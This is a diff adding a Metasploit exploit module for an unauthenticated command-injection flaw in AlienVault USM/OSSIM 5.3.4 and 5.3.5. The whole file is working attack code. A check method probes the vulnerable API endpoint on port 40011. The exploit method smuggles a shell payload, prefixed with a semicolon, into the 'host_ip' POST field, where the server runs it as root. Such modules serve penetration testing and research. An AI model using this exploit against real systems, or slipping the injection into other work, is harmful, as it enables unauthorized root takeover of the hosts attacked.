@@ -1,0 +1,91 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'          => 'AlienVault USM/OSSIM API Command Execution',
+      'Description'   => %q{
+        This module exploits an unauthenticated command injection in Alienvault USM/OSSIM versions 5.3.4 and 5.3.5. The vulnerability lies in an API function that does not check for authentication and then passes user input directly to a system call as root. 
+      },
+      'Author'        =>
+        [
+          'Unknown', # Privately disclosed to Alienvault
+          'Peter Lapp (lappsec@gmail.com)' # Metasploit module
+        ],
+      'License'       => MSF_LICENSE,
+      'References'    =>
+        [
+          ['URL', 'https://www.alienvault.com/forums/discussion/8415/']
+        ],
+      'Privileged'     => false,
+      'Platform'       => 'unix',
+      'Arch'           => ARCH_CMD,
+      'Payload'        =>
+        {
+          'Compat'      => {
+            'PayloadType' => 'cmd'
+          }
+        },
+      'DefaultOptions' =>
+        {
+          'SSL' => true
+        },
+      'Targets'        =>
+        [
+          [ 'Automatic', { }]
+        ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Feb 5 2017'))
+
+    register_options(
+      [
+        Opt::RPORT(40011)
+      ], self.class)
+  end
+
+  def check
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'      => normalize_uri(target_uri.path, '/av/api/1.0/system/local/network/fqdn'),
+      'vars_post' => {
+        'host_ip'    => "127.0.0.1"
+      },
+          'headers'  => {
+            'Accept' => "application/json"
+      }
+    })
+
+    if res and res.code == 200 and res.body.include?('success')
+      return Exploit::CheckCode::Vulnerable
+    end
+
+    return Exploit::CheckCode::Safe
+  end
+
+  def exploit
+
+    print_status("Executing payload...")
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'      => normalize_uri(target_uri.path, '/av/api/1.0/system/local/network/fqdn'),
+      'vars_post' => {
+        'host_ip'    => ";#{payload.encoded}"
+      },
+          'headers'  => {
+            'Accept' => "application/json"
+      }
+    })
+  end
+
+
+end
